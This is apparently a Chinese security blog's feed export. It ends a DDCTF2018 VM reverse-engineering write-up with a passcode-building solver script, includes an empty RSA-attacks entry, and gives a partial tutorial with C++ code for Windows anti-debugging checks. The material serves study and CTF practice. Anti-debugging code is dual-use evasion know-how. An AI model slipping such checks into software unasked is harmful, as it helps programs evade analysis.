class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>opcode如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">opcode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到opcode在byte_603F00数组中的下标v2：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">v2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> opcode<span class="token punctuation">:</span>    v2<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>ida_chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment">#v2 = ['$', '8', 'C', 't', '0', 'E', 'u', '#', ';']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再动态调试找到opcode对应的函数及作用：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""通过分析得知对应变量的含义a1      ==&gt; heap_addra1+16   ==&gt; Passcodea1+664  ==&gt; next = Passcode[i+1]a1+665  ==&gt; byte  -- tempa1+288  ==&gt; DWORD -- str_indexa1+292  ==&gt; DWORD -- str_lena1+280  ==&gt; DWORD -- 0x110a1+8    ==&gt; DWORD -- str --&gt; "PaF0!&amp;Prv}H{ojDQ#7v="0::$ ==&gt; sub_400DC1: temp = str[str_index]1::8 ==&gt; sub_400E7A: str[str_index] = temp2::C ==&gt; sub_400F3A: temp = temp + next - 333::t ==&gt; sub_401064: temp = temp - next + 33  if !*(a1 + 665): ++temp 4::0 ==&gt; sub_4011C9: ++str_index5::E ==&gt; sub_40133D: check()6::u ==&gt; sub_4012F3:  --str_index  7::# ==&gt; sub_4014B9: {      if str_index &lt; str_len and next - 48 &lt; 41        str[str_index] = Passcode[str_index + next - 48] - 49}8::; ==&gt; sub_400CF1: {     str_index += next    if next - 16 &lt;= 89:         str[str_index] = Passcode[str_index + next - 48] - 49}"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们再回到sub_40113D这个函数，即对byte_603F00交叉引用跟踪到sub_40113D函数</p><ul><li>这里，就可以有想法了，我们的目标是输出<code>Binggo</code>，而这里输出str字符串，并且在上面可以看出：<code>#</code>，<code>；</code>对应的函数是可以修改str字符串的，所以我们只需要构造一个Passcode输入，把str字符串修改为<code>Binggo</code>即可，但是这里需要注意，str字符串长度为20比<code>Binggo</code>长度大，所以最后还有构造一个<code>\x00</code>去截断。</li></ul><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/6.png"></p><p>构造Passcode</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""举一个例子：$t/80$ ==&gt; temp = str[0] =  'P't ==&gt; temp = temp - next +33 = 'P' - next + 33，我们的目标是让temp为'B'，所以 next = '/'/8 ==&gt; str[0] = temp = 'B'0 ==&gt; str_index++ ==&gt; str_index = 1，处理下一个字符"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> <span class="token string">"PaF0!&amp;Prv}H{ojDQ#7v="</span>t <span class="token operator">=</span> <span class="token string">"Binggo"</span>s <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">+=</span> <span class="token string">"$"</span>    temp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">33</span>    <span class="token keyword">if</span> temp <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">:</span> <span class="token comment">#必须为可见字符</span>        temp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">33</span>        s <span class="token operator">+=</span> <span class="token string">"C"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        s <span class="token operator">+=</span> <span class="token string">'t'</span>    s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"80"</span>s <span class="token operator">+=</span> <span class="token string">"#"</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">-</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"1"</span> <span class="token comment">#构造\x00截断</span>s <span class="token operator">+=</span> <span class="token string">"uuuuuuEs"</span> <span class="token comment">#通过u把str_index移动到str最开始的位置，并通过E进入check()函数，s则绕过*(a1 + 664) == 's'检查</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment">#s = "$t/80$C)80$CI80$CX80$Cg80$Cj80#J1uuuuuuEs"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/7.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF-RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-RE </tag>
            
            <tag> VM逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA常见攻击</title>
      <link href="/2023/04/05/rsa-chang-jian-gong-ji/"/>
      <url>/2023/04/05/rsa-chang-jian-gong-ji/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
            <tag> Crypto </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AntiBebug</title>
      <link href="/2023/04/04/antibebug/"/>
      <url>/2023/04/04/antibebug/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="TEB、PEB结构简介"><a href="#TEB、PEB结构简介" class="headerlink" title="TEB、PEB结构简介"></a>TEB、PEB结构简介</h4><p>TEB：线程环境块。进程中每一个线程都有自己的TEB。系统在TEB中保存频繁使用的线程相关的数据，<strong>位于用户地址空间</strong>。在用户模式下，可通过CPU的FS寄存器来访问TEB所在段，<strong>一般存储在[FS:0]处</strong>。</p><p>PEB：进程环境块。存放进程信息，每个进程都有自己的PEB信息，位于用户地址空间。</p><p>TEB中我们关心的成员：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">+</span><span class="token number">0x000</span> NtTib   <span class="token operator">:</span>_NT_TIB<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">0x30</span> ProcessEnvironmentBlock       <span class="token operator">:</span>Ptr32_PEB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>1）NtTib结构体(TIB即线程信息块)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token class-name">_NT_TIB</span><span class="token punctuation">{</span> <span class="token keyword">struct</span><span class="token class-name">_EXCEPTION_REGISTRATION_RECORD</span> <span class="token operator">*</span>ExceptionList<span class="token punctuation">;</span> PVOID StackBase<span class="token punctuation">;</span> PVOID StackLimit<span class="token punctuation">;</span>  PVOID SubSystemTib<span class="token punctuation">;</span>  <span class="token keyword">union</span> <span class="token punctuation">{</span>PVOID FiberData<span class="token punctuation">;</span> DWORD Version<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>  PVOID ArbitraryUserPointer<span class="token punctuation">;</span>  <span class="token keyword">struct</span><span class="token class-name">_NT_TIB</span> <span class="token operator">*</span>Self<span class="token punctuation">;</span><span class="token punctuation">}</span> NT_TIB<span class="token punctuation">;</span><span class="token keyword">typedef</span> NT_TIB <span class="token operator">*</span>PNT_TIB<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>0x00：ExceptionList指向_EXCEPTION_REGISTRATION_RECORD结构体(用于SEH)组成的链表;</li><li>0x18：self指向 NtTib自己，而 NtTib是TEB的第一个成员，所以self等于指向TEB结构体；</li></ul><p>在用户模式下，可以使用**Ntdll.NtCurrentTeb()**API得到TEB结构体的地址，即返回FS:[0x18]的值，self就位于FS:[0x18]地址处。</p><p>2）ProcessEnvironmentBlock(即PEB)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">+</span><span class="token number">002</span>BeingDebugged <span class="token punctuation">;</span><span class="token function">Uchar</span><span class="token punctuation">(</span>可用于反调试技术<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">008</span>ImageBaseAddress  <span class="token punctuation">;</span>Ptr32 Void<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">00</span>cLdr  <span class="token punctuation">;</span>Ptr32 <span class="token function">_PEB_LDR_DATA</span><span class="token punctuation">(</span>可用于反调试技术<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">018</span>ProcessHeap  <span class="token punctuation">;</span>Ptr32 <span class="token function">Void</span><span class="token punctuation">(</span>可用于反调试技术<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">068</span>NtGlobalFlag   <span class="token punctuation">;</span><span class="token function">uint4B</span><span class="token punctuation">(</span>可用于反调试技术<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>+002：BeingDebugged标识当前进程是否处于调试状态，是则为1，否则为0。可以使用**IsDebuggerPresent()**API获取该值;</li><li>+008：ImageBaseAddress记录当前进程的ImageBase，可以使用**GetModuleHandle()**API用来获取ImageBase;</li><li>+00c：Ldr结构体，调试进程时，其堆内存区域中会出现一些特殊标识,表名它正处于被调试状态，未使用的堆内存区域全部填充着0xEEFEEEFE，利用这一特征可判断是否处于被调试状态。Ldr 指向 PEB_LDR_DATA结构体指针，PEB_LDR_DATA恰好是在堆中创建的。<strong>检测PEB_LDR_DATA是否是0xEEFEEEFE即可判断是否处于被调试</strong>；</li><li>+018：ProcessHeap结构体里面由两个重要成员；</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">+</span><span class="token number">0xC</span>  Flags<span class="token operator">+</span><span class="token number">0x10</span> ForceFlags程序正常运行时：​ HEAP<span class="token punctuation">.</span>Flags<span class="token operator">=</span><span class="token number">0x2</span>​ HEAP<span class="token punctuation">.</span>ForceFlags<span class="token operator">=</span><span class="token number">0</span>调试时会发生变化。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>+068：NtGlobalFlag，<strong>调试进程时，NtGlobalFlag会被置为0x70</strong>；</li></ul><p>得到如下地址关系：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">FS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> FS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0x18</span><span class="token punctuation">]</span> <span class="token operator">=</span> TEB<span class="token punctuation">.</span>NtTib<span class="token punctuation">.</span>self <span class="token operator">=</span> TEB<span class="token punctuation">.</span>NtTib <span class="token operator">=</span> address of SEH <span class="token operator">=</span> address of TEBFS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> TEB<span class="token punctuation">.</span>ProcessEnvironmentBlock <span class="token operator">=</span> address of PEB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="常见静态反调试（基本没用"><a href="#常见静态反调试（基本没用" class="headerlink" title="常见静态反调试（基本没用"></a>常见静态反调试（基本没用</h3><h4 id="PEB字段利用"><a href="#PEB字段利用" class="headerlink" title="PEB字段利用"></a>PEB字段利用</h4><h5 id="BeingDebugged（002）"><a href="#BeingDebugged（002）" class="headerlink" title="BeingDebugged（002）"></a>BeingDebugged（002）</h5><p>进程处于调试状态时，PEB.BeingDebugged成员的值设为非0，在非调试状态下为0;</p><ul><li>获取PEB.BeingDebugged</li></ul><pre class="line-numbers language-none"><code class="language-none">1)直接获取mov eax, FS:[0x30]movzx eax, Fs:[eax + 0x2]2)先获取TEB,再获取PEBmov eax, FS:[0x18]//mov eax, FS:[0]mov eax, FS:[eax + 0x30]movzx eax, Fs:[eax + 0x2]3)API获取(其实该API就是利用上述2)中的汇编)IsDebuggerPresent() APIBOOL IsDebuggerPresent();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>测试：直接(VS)F5调试即可，在OD中有插件会直接过掉反调试。</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int __declspec(naked) GetBeingBubugged() {__asm {push ebpmov ebp, espsub esp, 0x40push edipush esipush ebxpush ecxlea edi, dword ptr ds:[ebp-0x40]mov ecx, 0x10mov eax, 0xCCCCCCCCrep stos        //这就是IsDebuggerPresent()API的核心逻辑mov eax, dword ptr fs : [0x18]mov eax, dword ptr ds : [eax + 0x30]movzx eax, byte ptr ds : [eax + 0x2]pop ecxpop ebxpop esipop edimov esp, ebppop ebpret}}int main(){if (GetBeingBubugged()) {MessageBox(NULL, L"Funk You", L"AntiDebug", MB_OK);::ExitProcess(0);}system("pause");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接ctrl+F5时，并没有弹框；但是当F5调试时，弹框。</p><p><img src="/2023/04/04/antibebug/0.png" alt="Ctr1+F5"></p><p><img src="/2023/04/04/antibebug/1.png" alt="F5"></p><ul><li>直接修改PEB.BeingDebugged的值或者IsDebuggerPresent() 的返回值即可过掉(这个反调试拖入OD就被插件过掉了，就不演示)。</li></ul><h5 id="Ldr（00c）"><a href="#Ldr（00c）" class="headerlink" title="Ldr（00c）"></a>Ldr（00c）</h5><p>PEB.Ldr 指向_PEB_LDR_DATA结构体指针，_PEB_LDR_DATA恰好是在堆中创建的。检测_PEB_LDR_DATA是否是0xEEFEEEFE即可判断是否处于被调试；</p><ul><li>测试：我在自己电脑上并没有效果，看网上说这个方法在win vista之后已经无效，但还是记录一下。</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">//检测Ldr，Win XP有效DWORD __declspec(naked) GetLdr() {__asm {push ebpmov ebp, espsub esp, 0x40push edipush ecxlea edi, dword ptr ds:[ebp-0x40]mov ecx, 0x10mov eax, 0xCCCCCCCCrep stosmov eax, dword ptr fs : [0x18]mov eax, dword ptr ds : [eax + 0x30]mov eax, dword ptr ds : [eax + 0xC]pop ecxpop edimov esp, ebppop ebpret }}int AntiDubugByGetLdr() {DWORD ldrAddr = GetLdr();DWORD data = 0;int i = 0;HANDLE handle = ::OpenProcess(PROCESS_ALL_ACCESS, false, ::GetCurrentProcessId());while (i &lt; 0x1000){ReadProcessMemory(handle, (LPVOID)ldrAddr, &amp;data, 4, NULL);//判断内存中是否含有0xEEFEEEFEif (data == 0xEEFEEEFE)return 1;ldrAddr += 4;i++;}return 0;}int main(){if (AntiDubugByGetLdr()) {MessageBox(NULL, L"Funk You", L"AntiDebug", MB_OK);::ExitProcess(0);}system("pause");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将填充着0xEEFEEEFE的区域写为NULL即可过掉</li></ul><h5 id="ProcessHeap（018）"><a href="#ProcessHeap（018）" class="headerlink" title="ProcessHeap（018）"></a>ProcessHeap（018）</h5><p>程序正常运行时，ProcessHeap.Flags=0x2，ProcessHeap.ForceFlags=0，调试时会发生变化；</p><p>Win 7之后：ProcessHeap.Flags偏移为0x40，ProcessHeap.ForceFlags偏移为x44；</p><ul><li>测试：之前xp虚拟机被玩坏了）Win 10测试 <strong>我发现好像没有用，不管是否调试，Flags==0x2，ForceFlags==0</strong>；</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void AntiDebugByProcessHeap() {DWORD Flags;DWORD ForceFlags;__asm {push eax;mov eax, fs:[0x30];mov eax, ds:[eax + 0x18];mov eax, dword ptr[eax + 0x40]mov dword ptr[Flags], eax;mov eax, fs:[0x30];mov eax, ds:[eax + 0x18];mov eax, dword ptr[eax + 0x44]mov dword ptr[ForceFlags], eax;pop eax;}std::cout &lt;&lt; Flags &lt;&lt; std::endl &lt;&lt; ForceFlags &lt;&lt; std::endl;if (Flags != 2 || ForceFlags != 0) {MessageBox(NULL, L"Funk You", L"AntiDebug", MB_OK);::ExitProcess(0);}else {std::cout &lt;&lt; "Hello World!\n";}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="NtGlobalFlag（068）"><a href="#NtGlobalFlag（068）" class="headerlink" title="NtGlobalFlag（068）"></a>NtGlobalFlag（068）</h5><p>调试进程时，PEB.NtGlobalFlag会被置为0x70；</p><ul><li>测试：Win 10测试 <strong>好像还是没有用，不管是否调试，NtGlobalFlag==0</strong>；</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void AntiDebugByNtGlobalFlag() {DWORD Flags;__asm {push eax;mov eax, fs:[0x30];mov eax, [eax + 0x68]mov dword ptr[Flags], eax;pop eax;}std::cout &lt;&lt; Flags &lt;&lt; std::endl;if (Flags == 0x70) {MessageBox(NULL, L"Funk You", L"AntiDebug", MB_OK);::ExitProcess(0);}else {std::cout &lt;&lt; "Hello World!\n";}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Windows-API的利用"><a href="#Windows-API的利用" class="headerlink" title="Windows API的利用"></a>Windows API的利用</h4><h5 id="IsDebuggerPresent"><a href="#IsDebuggerPresent" class="headerlink" title="IsDebuggerPresent"></a>IsDebuggerPresent</h5><p>IsDebuggerPresent查询进程环境块(PEB)中的IsDebugged标志。</p><ul><li>如果进程没有运行在调试器环境中，函数返回0；</li><li>如果调试附加了进程，函数返回一个非零值。</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">BOOL IsDebuggerPresent();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a>CheckRemoteDebuggerPresent</h5><p>CheckRemoteDebuggerPresent同IsDebuggerPresent几乎一致。它不仅可以探测系统其他进程是否被调试，通过传递自身进程句柄还可以探测自身是否被调试。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">BOOL CheckRemoteDebuggerPresent(  [in]      HANDLE hProcess,  [in, out] PBOOL  pbDebuggerPresent);/*[in] hProcess进程的句柄。[in, out] pbDebuggerPresent如果正在调试指定的进程，则函数设置为 TRUE 的变量的指针，否则为 FALSE。*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="NtQueryInformationProcess"><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess"></a>NtQueryInformationProcess</h5><p>该函数检索有关指定进程的信息，是ntdll.dll中一个未公开的API函数，需要自己加载；</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NTSYSAPI NTSTATUS NTAPI NtQueryInformationProcess (　　IN HANDLE 　　　　　　　　ProcessHandle, 　　　　　　 // 进程句柄　　IN PROCESSINFOCLASS 　　InformationClass, 　　　　 // 信息类型　　OUT PVOID 　　　　　　　　ProcessInformation, 　　　 // 缓冲指针　　IN ULONG 　　　　　　 　　ProcessInformationLength, // 以字节为单位的缓冲大小　　OUT PULONG 　　　　　 　　ReturnLength OPTIONAL     // 写入缓冲的字节数);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 与调试有关的第二个参数(InformationClass)的值:<br> ProcessDebugPort(0x07) , ProcessDebugObjectHandle(0x1E) , ProcessDebugFlags(0x1F)<br> 第二个参数指定不同的值 , 返回结果会返回在 ProcessInformation(第三个参数)；</p><ul><li><p>ProcessDebugPort(0x07)</p></li><li><p>进程处于调试状态时,操作系统会为他分配1个调试端口(debug port) , InformationClass设为ProcessDebugPort(0x07) 时,调用NtQueryInformationProcess()函数就可以获取调试端口.。<br> <strong>若处于调试状态 ，第三个参数会被置为0xFFFFFFFF(-1)<br> 若处于非调试状态，第三个参数值会被设置为0；</strong></p></li><li><p>CheckRemoteDebuggerPresent() API<br>实际上也是调用了NtQueryInformationProcess(ProcessDebugPort)</p></li><li><p>ProcessDebugObjectHandle(0x1E)</p><ul><li>调试进程时，会生成一个调试对象(Debug Obiect)。NtQueryInformationProcess()第二个参数值为0x1E时 , 函数的第三个参数就能获取到调试对象句柄 。<br><strong>进程处于调试状态==&gt;调试句柄存在==&gt;返回值不为NULL<br>处于非调试状态 , 返回值为NULL；</strong></li></ul></li><li><p>ProcessDebugFlags(0x1F)</p></li><li><p>调试标志:Debug Flags，检测调试标志的值也可以判断进程是否处于被调试状态；<br>NtQueryInformationProcess()第二个参数为0x1F<br><strong>第三个参数：调试状态：0，非调试状态：1；</strong></p></li></ul><p>测试代码：win 10可以测试成功；<strong>Note：</strong>定义函数指针时，我在win10中没有找到PROCESSINFOCLASS这个数据类型，但是它的本质就是一个’整数’，所以定义成DWORD就行。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef NTSTATUS(WINAPI *PNtQueryInformationProcess)(_In_      HANDLE           ProcessHandle,_In_      DWORD   ProcessInformationClass,_Out_     PVOID            ProcessInformation,_In_      ULONG            ProcessInformationLength,_Out_opt_ PULONG           ReturnLength);void AntiDebugByNtQueryInformationProcess() {HMODULE ntdll = LoadLibrary(TEXT("Ntdll.dll"));if (ntdll == NULL) {std::cout &lt;&lt; "ntdll加载失败" &lt;&lt; std::endl;::ExitProcess(0);}PNtQueryInformationProcess NtQueryInformationProcess = (PNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");if (NtQueryInformationProcess == NULL) {std::cout &lt;&lt; "函数导入失败" &lt;&lt; std::endl;::ExitProcess(1);}DWORD isDebuggerPresent0 = FALSE;DWORD isDebuggerPresent1 = FALSE;DWORD isDebuggerPresent2 = FALSE;HANDLE handle = ::GetCurrentProcess();NTSTATUS status0 = NtQueryInformationProcess(handle, 0x7, &amp;isDebuggerPresent0, sizeof(DWORD), NULL);NTSTATUS status1 = NtQueryInformationProcess(handle, 0x1E, &amp;isDebuggerPresent1, sizeof(DWORD), NULL);NTSTATUS status2 = NtQueryInformationProcess(handle, 0x1F, &amp;isDebuggerPresent2, sizeof(DWORD), NULL);std::cout &lt;&lt; isDebuggerPresent0 &lt;&lt; std::endl &lt;&lt; isDebuggerPresent1 &lt;&lt; std::endl &lt;&lt; isDebuggerPresent2 &lt;&lt; std::endl;if (!status0 &amp;&amp; !status1 &amp;&amp; !status2 &amp;&amp; isDebuggerPresent0 &amp;&amp; isDebuggerPresent1 &amp;&amp; !isDebuggerPresent2){MessageBoxA(NULL, "Debug detected", "NtQueryInformationProcess", MB_OK);return;}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/04/antibebug/2.png"></p><h5 id="NtQuerySystemInformation"><a href="#NtQuerySystemInformation" class="headerlink" title="NtQuerySystemInformation"></a>NtQuerySystemInformation</h5><h5 id="NtQueryObject"><a href="#NtQueryObject" class="headerlink" title="NtQueryObject"></a>NtQueryObject</h5><h5 id="GetLastError"><a href="#GetLastError" class="headerlink" title="GetLastError"></a>GetLastError</h5><ul><li><p>编写应用程序时，经常需要涉及到错误处理问题。许多函数调用只用TRUE和FALSE来表明函数的运行结果。一旦出现错误，MSDN中往往会指出请用GetLastError()函数来获得错误原因。恶意代码可以使用异常来破坏或者探测调试器。</p></li><li><p>调试器捕获异常后，并不会立即将处理权返回被调试进程处理，大多数利用异常的反调试技术往往据此来检测调试器。多数调试器默认的设置是捕获异常后不将异常传递给应用程序。如果调试器不能将异常结果正确返回到被调试进程，那么这种异常失效可以被进程内部的异常处理机制探测。</p></li><li><p>对于OutputDebugString函数，它的作用是在调试器中显示一个字符串，同时它也可以用来探测调试器的存在。<strong>使用SetLastError函数，将当前的错误码设置为一个任意值。</strong></p><ul><li><strong>如果进程没有被调试器附加</strong>，调用OutputDebugString函数会失败，错误码会重新设置，<strong>因此GetLastError获取的错误码应该不是我们设置的任意值</strong>。</li><li><strong>如果进程被调试器附加</strong>，调用OutputDebugString函数会成功，<strong>这时GetLastError获取的错误码应该没改变</strong>。</li></ul></li><li><p>对于DeleteFiber函数，如果给它传递一个无效的参数的话会抛出ERROR_INVALID_PARAMETER异常。如果进程正在被调试的话，异常会被调试器捕获。所以，同样可以通过验证LastError值来检测调试器的存在。如代码所示，<strong>0x57就是指ERROR_INVALID_PARAMETER。</strong></p></li><li><p>同样还可以使用CloseHandle、CloseWindow产生异常，使得错误码改变。</p></li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">BOOL CheckDebug0(){     DWORD errorValue = 12345;      